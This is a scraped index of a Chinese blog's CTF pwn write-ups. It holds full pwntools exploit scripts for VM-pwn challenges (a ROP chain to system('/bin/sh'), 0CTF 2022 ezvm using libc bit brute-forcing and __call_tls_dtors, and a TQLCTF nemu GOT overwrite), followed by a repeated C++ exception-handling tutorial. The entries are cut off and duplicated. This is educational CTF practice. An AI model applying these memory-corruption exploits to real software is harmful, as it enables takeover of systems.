context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn1' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" # bbase 0x1b70 # bbase 0x1AFB #Unsupported instruction的leave;ret bbase 0x1aad c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): # gdb.attach(p) gdb.attach(p, gdbscript=gdbscript) # pause() def op(opcode,high,medium,low): ope = p32(opcode\u003c\u003c28 | (high\u00260x1f)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (low\u00260x1f)) return ope def add(high,medium,low): return op(1,high,medium,low) def sub(high,medium,low): return op(2,high,medium,low) def load(offset,medium,src,opcode=9): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (src\u00260x1f)) return ope def store(offset,medium,dest,opcode=10): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (dest\u00260x1f)) return ope base_addr = 0x120+0x38 dest_offset = 0x118 #dest: # 04:0020│ rdx rsi 0x7ffe2b9fa530 —▸ 0x7955af50f78b (__spawnix+875) ◂— pop rdi #ret_addr: # 27:0138│+008 0x7ffe2b9fa648 —▸ 0x5ac76e63fb9d ◂— nop opcode = store(0xd38,0,0) #libc地址给寄存器0 opcode+= store(base_addr,20,1) #system的偏移给寄存器1，20这里随便设置，不和low一样就行 opcode+= store(base_addr+8,20,2) #binsh的偏移给寄存器2 opcode+= store(base_addr+0x10,20,3) #ret的偏移给寄存器3 opcode+= store(base_addr+0x18,20,4) #pop_rdi_ret偏移给寄存器4 opcode+= add(0,1,5) #寄存器5=寄存器0+system偏移=system地址 opcode+= add(0,2,6) #寄存器6=寄存器0+binsh偏移=binsh地址 opcode+= sub(3,0,7) #寄存器7=寄存器0-ret偏移=ret地址 opcode+= add(0,4,8) #寄存器8=寄存器0+pop_rdi_ret偏移=pop_rdi_ret地址 opcode+= load(dest_offset,20,8) #pop_rdi_ret opcode+= load(dest_offset+8,20,6) #binsh opcode+= load(dest_offset+0x10,20,7) #ret opcode+= load(dest_offset+0x18,20,5) #system opcode+=p32(0) opcode+=p64(0x2e586) #system opcode+=p64(0x1a1265) #binsh opcode+=p64(0x199b) #ret opcode+=p64(0xe55c1) #pop_rdi_ret # dbg() sla(b'opcode: ',opcode) itr() # sbase 0x40c0 # 0x7fff2d02dd50 #main栈帧中存储opcode地址 # 0x7fff2d02dc30 #execute 中stack地址 #之间偏移为0x120 #system = 寄存器0 + 0x2e586 #binsh = 寄存器0 + 0x1a1265 #ret = 寄存器0 - 0x199b #pop_rdi_ret = 寄存器0 + 0xe55c1 # pwndbg\u003e sbase 0x40c0 # 00:0000│ rax rdi 0x6127080540c0 —▸ 0x759f7fe2a1ca (__libc_start_call_main+122) ◂— mov edi, eax # 01:0008│ 0x6127080540c8 ◂— 0 # 02:0010│ 0x6127080540d0 ◂— 0 # 03:0018│ 0x6127080540d8 ◂— 0 # 04:0020│ 0x6127080540e0 ◂— 0 # 05:0028│ 0x6127080540e8 ◂— 0 # 06:0030│ 0x6127080540f0 ◂— 0 # 07:0038│ 0x6127080540f8 ◂— 0 # 08:0040│ 0x612708054100 ◂— 0 # 09:0048│ 0x612708054108 ◂— 0 # pwndbg\u003e p \u0026system # $1 = (int (*)(const char *)) 0x759f7fe58750 \u003c__libc_system\u003e # pwndbg\u003e search \"/bin/sh\" # Searching for byte: b'/bin/sh' # libc.so.6 0x759f7ffcb42f 0x68732f6e69622f /* '/bin/sh' */ # pwndbg\u003e p/x 0x759f7fe58750 - 0x759f7fe2a1ca # $2 = 0x2e586 # pwndbg\u003e p/x 0x759f7ffcb42f - 0x759f7fe2a1ca # $3 = 0x1a1265 #ret指令 # 0x000000000002882f : ret # pwndbg\u003e p/x 0x759f7fe2a1ca - 0x759f7fe2","date":"2025-10-23","objectID":"/posts/vmpwn/:3:2","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#exp-2"},{"categories":["pwn"],"collections":null,"content":"2020网鼎杯青龙组-boom1\rhttps://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba\u0026u_asig=1a0c381017440330108046584e0135 编译器类vmpwn 大概看了看，程序很大，实现了一个编译器，执行我们输入的C代码。 malloc(0x40000u);会走mmap，申请的变量和libc的偏移是固定的 我们可以定义一个变量，从这个变量的地址寻址到__free_hook和system函数，将后者覆写到前者，再调用free('/bin/sh')即可。 ","date":"2025-10-23","objectID":"/posts/vmpwn/:4:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#2020网鼎杯青龙组-boom1"},{"categories":["pwn"],"collections":null,"content":"0CTF/TCTF 2022 ezvm\r别的师傅WP：https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/ezvm 指令梳理： 0 push: 把memory的数据压入栈中 1 pop: 栈中数据弹出到memory 2-12 ： 对栈中数据进行加减乘除等操作，并把sp-1 13 : 判断栈顶是否为0 14-16： jmp jz jnz 17-19: 比较指令 20 mov: 写8字节到bss段（类似寄存器） 21 store:指定寄存器中数据写入到memory区域 22 load:把memory中的数据写入到指定寄存器 交互： push = lambda bss :p8(0)+p8(bss) #压入寄存器的内容到栈 and_f = lambda :p8(9) nz = lambda add_ip :p8(15)+p64(add_ip) jnz = lambda add_ip :p8(16)+p64(add_ip) mov = lambda bss,imm :p8(0x14)+p8(bss)+p64(imm) #imm-\u003e寄存器 store = lambda bss,memory :p8(0x15)+p8(bss)+p64(memory) #寄存器-\u003ememory load = lambda bss,memory :p8(0x16)+p8(bss)+p64(memory) #mrmory-\u003e寄存器 exit_f = lambda :p8(0x17) 关键点在于这个malloc会把size左移3个bit，传入0x2000000000030000就能越界写 .text:0000000000002353 mov rax, [rbp+size_1] .text:0000000000002357 shl rax, 3 .text:000000000000235B mov [rbp+var_10], rax .text:000000000000235F mov rax, [rbp+var_10] .text:0000000000002363 mov rdi, rax ; size .text:0000000000002366 call _malloc 思路： free一个堆块进unsorted bin，memory 区域会留下libc 爆破出libc 利用__call_tls_dtors来getshell ","date":"2025-10-23","objectID":"/posts/vmpwn/:5:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#0ctftctf-2022-ezvm"},{"categories":["pwn"],"collections":null,"content":"exp\r不知道为什么最后bye bye的时候退不出去。。 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\",\"-p\",\"65\",\"-b\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" # bbase 0x23BF #call execute # bbase 0x2353 #malloc # bbase 0x228E #out malloc bbase 0x14e2 #free # bbase 0x1a0d #shr # bbase 0x1582 #switch # bbase 0x246F #exit c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() push = lambda bss :p8(0)+p8(bss) #压入寄存器的内容到栈 and_f = lambda :p8(9) nz = lambda add_ip :p8(15)+p64(add_ip) jnz = lambda add_ip :p8(16)+p64(add_ip) mov = lambda bss,imm :p8(0x14)+p8(bss)+p64(imm) #imm-\u003e寄存器 store = lambda bss,memory :p8(0x15)+p8(bss)+p64(memory) #寄存器-\u003ememory load = lambda bss,memory :p8(0x16)+p8(bss)+p64(memory) #mrmory-\u003e寄存器 exit_f = lambda :p8(0x17) #让memory为main_arena地址 sla(b'0ctf2022!!\\n',b'aaaa') opcode = exit_f() sla(b'code size:\\n',str(len(opcode))) sla(b'memory count:\\n',str(0x410\u003e\u003e3)) sla(b'input your code:\\n',opcode) # sla(b'continue?\\n',b'c') #爆破获取libc libc_base = 0x700000000000 for i in range(4,45,1): print('leaking bit '+str(i)) opcode = mov(0,1\u003c\u003ci) #bitmask存入r0 opcode+= push(0) #bitmask 压栈 opcode+= load(1,0) #main_arena地址存入r1 opcode+= push(1) #r1压栈 opcode+= and_f() #bit_mask 和 main_arena 与运算 opcode+= jnz(1) #该bit为0就exit opcode+= b'\\x18' + exit_f() sla(b'code size:\\n',str(len(opcode))) sla(b'memory count:\\n',str(0x410\u003e\u003e3)) sla(b'input your code:\\n',opcode) buffer = ru(b'finish!\\n',drop=True) if b'what' in buffer: libc_base |= 1\u003c\u003ci libc_base -= 0x219ce0 libc.address = libc_base lg(\"libc_base\") def rol(value): return (value \u003c\u003c 0x11) | (value \u003e\u003e (64 - 0x11)) \u0026 0xffffffffffffffff dest = rol(libc.sym['system']) #$fs_base + 0x30（randnumber） 置0 #0x181760 fs_base+0x30 opcode = store(0,0x302ec) # clear rand val opcode+= mov(0,libc_base - 0x2a00) #0x1816d8 $fs_base - 88 opcode+= store(0,0x302db) # rbp val opcode+= mov(0,dest) #0x1815f0 $fs_base - 0x140 opcode+= store(0,0x302be) # rbp val opcode+= mov(0,next(libc.search(b'/bin/sh'))) #0x1815f8 $fs_base - 0x138 opcode+= store(0,0x302bf) # rbp val opcode+= exit_f() sla(b'code size:\\n',str(len(opcode))) sla(b'memory count:\\n',str(0x2000000000030000)) sl(opcode) dbg() sla(b'continue?', b\"bye bye\\x00\") itr() # p/x $fs_base # opcode_ptr memory_ptr stack_ptr opcodesize mesize # sbase 0x5040 #stack sp #sbase 0x5090 # dq 0x181760 + memory_ptr ","date":"2025-10-23","objectID":"/posts/vmpwn/:5:1","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#exp-3"},{"categories":["pwn"],"collections":null,"content":"TQLCTF2022_nemu\r别的师傅评价：一个完全无限制的越界读写问题。但是看似简单，读写操作的时候还需要经过一些检查。很值得一做。很适合作为VM pwn的入门题目仔细分析(正好也有源码，漏洞很经典) 这题主要考点：理解⼀个模拟器及调试器的整体架构，给了源码 交互： help:查看所有指令description si:单步执行1次 si 2:单步执行2次 c:一直执行 info r:查看寄存器 info w:查看断点 x 0x100005 :查看内容 x 4 0x100000：查看4个dword内容 w *0x100000：设置watch point d 1:删除第一个watch point set \u003c地址\u003e \u003c数据\u003e：修改数据 这里比较重要的就是guest_to_host这个宏 uint32_t vaddr_read(vaddr_t addr, int len) { return paddr_read(addr, len); } uint32_t paddr_read(paddr_t addr, int len) { return pmem_rw(addr, uint32_t) \u0026 (~0u \u003e\u003e ((4 - len) \u003c\u003c 3)); } #define pmem_rw(addr, type) *(type *)({\\ guest_to_host(addr); \\ }) /* convert the guest physical address in the guest program to host virtual address in NEMU */ #define guest_to_host(p) ((void *)(pmem + (unsigned)p)) 这个宏的p是真实的物理地址 pwndbg\u003e disass vaddr_read Dump of assembler code for function vaddr_read: 0x0000000000406ee0 \u003c+0\u003e: mov ecx,0x4 0x0000000000406ee5 \u003c+5\u003e: mov edi,edi 0x0000000000406ee7 \u003c+7\u003e: mov eax,0xffffffff 0x0000000000406eec \u003c+12\u003e: sub ecx,esi 0x0000000000406eee \u003c+14\u003e: shl ecx,0x3 0x0000000000406ef1 \u003c+17\u003e: shr eax,cl 0x0000000000406ef3 \u003c+19\u003e: and eax,DWORD PTR [rdi+0x6a3b80] 0x0000000000406ef9 \u003c+25\u003e: ret End of assembler dump. 查看汇编可以看到0x6a3b80就是p pwndbg\u003e dq 0x6a3b80+0x100000 0x7a3b80 \u003cpmem+1048576\u003e: 0x0027b900001234b8 0x0441c76601890010 0x7a3b90 \u003cpmem+1048592\u003e: 0x6600000002bb0001 0x01ffffe0009984c7 0x7a3ba0 \u003cpmem+1048608\u003e: 0x00d600000000b800 0x0000000000000000 0x7a3bb0 \u003cpmem+1048624\u003e: 0x0000000000000000 0x0000000000000000 100000: b8 34 12 00 00 movl $0x1234,%eax 这里也对应上了 而这里也没有对于边界的检查，所以可以进行越界读，set可以进行越界写 这里需要通过watchpoint去泄露 watchpoint数据结构 typedef struct watchpoint { int NO; struct watchpoint *next; /* TODO: Add more members if necessary */ char exp[30]; uint32_t old_val; uint32_t new_val; } WP; 考虑结构体内存对齐，实际上的内存结构： typedef struct watchpoint { int NO; // Offset: 0x0, Size: 0x4 bytes struct watchpoint *next; // Offset: 0x4, Size: 0x8 bytes /* TODO: Add more members if necessary */ char exp[30]; // Offset: 0x10, Size: 0x1e bytes uint32_t old_val; // Offset: 0x30, Size: 4 bytes uint32_t new_val; // Offset: 0x34, Size: 4 bytes } WP; //总共0x38 list_watchpoint: void list_watchpoint(){ WP *head2 = head; if(head == NULL) { printf(\"No watch pint to delete\\n\"); return; } printf(\"NO Expr Old Value New Value\\n\"); while(head2){ printf(\"%d %-18s %#x %#x\\n\",head2-\u003eNO,head2-\u003eexp,head2-\u003eold_val,head2-\u003enew_val); head2 = head2-\u003enext; } return; } pwndbg\u003e p \u0026head $7 = (WP **) 0x86a3fc8 \u003chead\u003e pwndbg\u003e x/8gx 0x60f018-0x20 0x60eff8: 0x0000000000000000 0x000000000060ee18 0x60f008: 0x00007d7a583572e0 0x00007d7a583332f0 0x60f018 \u003c__snprintf_chk@got.plt\u003e: 0x00007d7a58137d30 0x00007d7a580add30 0x60f028 \u003cputchar@got[plt]\u003e: 0x0000000000401506 0x0000000000401516 这里要让libc地址位于head+0x30处，就能通过old_val new_val泄露出libc地址 #pwndbg\u003e p/x 0x86a3fc8-0x6a3b80 #$1 = 0x8000448 sl(b'set 0x8000448 0x60eff0') # dbg() sl(b'info w') ru(b'New Value') ru(b'0x') libc_low = int(p.recv(8),16) ru(b'0x') libc_high = int(p.recv(4),16) lg(\"libc_high\") lg(\"libc_low\") libc_base = (libc_high\u003c\u003c32) | libc_low lg(\"libc_base\") 写入system： WP *new_wp(){ if(free_ == NULL){ assert(0); } //unlink WP *temp = free_; free_ = free_-\u003enext; //insert temp-\u003enext = NULL; return temp; } void set_watchpoint(char *args){ bool flag = true; uint32_t val = expr(args, \u0026flag); if (!flag) { printf(\"You input an invalid expression, failed to create watchpoint!\"); return ; } WP *wp = new_wp(); wp-\u003eold_val = val; memcpy(wp-\u003eexp, args, 30); //... } 这里可以看到： WP *wp = free_; memcpy(wp-\u003eexp, args, 30); 也就是w 0xdeedbeef的时候，会把0xdeedbeef写入free_+0x30处 这样我们只需要去set free_再w就能实现任意写 这里的思路是写strcmp的got为system，在ui_mainloop中,strcmp的第一个参数就是我们输入的命令，输入binsh就行 exp: 这里我用的本地的libc from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda del","date":"2025-10-23","objectID":"/posts/vmpwn/:6:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#tqlctf2022_nemu"},{"categories":["pwn"],"collections":null,"content":"异常处理机制\r","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:0","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#异常处理机制"},{"categories":["pwn"],"collections":null,"content":"基础语法\r异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include \u003ciostream\u003e using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch\rtry { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开\r在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include \u003ciostream\u003e #include \u003cstdexcept\u003e using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAII\rC异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#基础语法"},{"categories":["pwn"],"collections":null,"content":"基础语法\r异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch\rtry { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开\r在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include #include using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAII\rC异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#trycatch"},{"categories":["pwn"],"collections":null,"content":"基础语法\r异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch\rtry { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开\r在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include #include using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAII\rC异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#函数退出与栈展开"},{"categories":["pwn"],"collections":null,"content":"基础语法\r异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch\rtry { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开\r在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include #include using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAII\rC异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#raii"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 